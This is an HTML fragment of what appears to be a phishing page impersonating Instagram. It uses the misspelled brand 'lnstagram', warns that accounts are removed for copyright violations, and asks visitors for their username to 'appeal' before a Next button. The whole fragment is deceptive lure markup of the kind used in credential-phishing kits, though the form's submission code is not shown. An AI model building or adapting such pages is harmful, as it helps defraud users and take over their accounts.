...
<br><br>
    ...
    <img src="https://www.pngarts.com/files/4/Instagram-PNG-Background-Image.png" width="200px"> 

<br><br>
    <p id="p">As lnstagram, we remove accounts that violate our copyright laws. Continue by entering your username to learn about and appeal to copyright infringement related to your account.</p>

<br>

    <input type="text" id="nick" name="nick" required="" placeholder="@username" class="qua21"><br><br>
    <input type="submit" value="Next" id="button" style="">
</center>
</div>
